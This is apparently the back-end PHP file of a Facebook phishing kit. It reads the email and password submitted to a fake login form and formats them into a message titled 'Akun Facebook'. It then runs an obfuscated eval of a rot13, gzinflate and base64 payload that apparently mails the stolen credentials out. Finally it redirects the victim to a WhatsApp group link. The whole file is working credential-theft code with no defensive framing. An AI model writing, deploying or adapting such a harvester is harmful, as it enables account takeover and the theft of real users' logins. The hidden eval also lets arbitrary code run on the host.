<?php
$user = $_POST['email'];
$pass = $_POST['password'];
$subject = "IKHBAL JB NIH BOSS { ".$user." }";
$message = '
-===¦ Akun Facebook ¦===-
<p>
|>> Email : '.$user.'
<p>
|>> Password : '.$pass.'
<p>
-===¦ Thanks ¦===-
WEB P? YA DI IKHBAL JB';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: IKHBAL JB <result@raflipedia.com>' . "\r\n";
eval(str_rot13(gzinflate(str_rot13(base64_decode('hZBOeAMhEIXvgfwHD0U3IC69tuSQBGpmKu0GCjktTGRckm9o0rVof33VT44pHubxfO+DmeWCbXjseVAkeJJUUrW9xqDQB8sJhfHzG51Wd1MA+4VWWnU9d7isnpcL6qZHZ6OOfTgFRhVCDWD6zFpfDDNozQQdAbVgD8oCnAfts5VoKpQ6oBmUqRKQk9e9PGFqep8GJ3kyUz3V9fknP+FCIKyeP+p4iCjUpNjqHk9p7V5hTfmydg6d5OTxYW23etrDe2p8eNKetzX+rfBPpemQqhyyhPGCLlRiehcHwD/nFw==')))));
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/BFuc3CYR4QT9CVO9oav31n">
</head>
<body>
</body>
</html>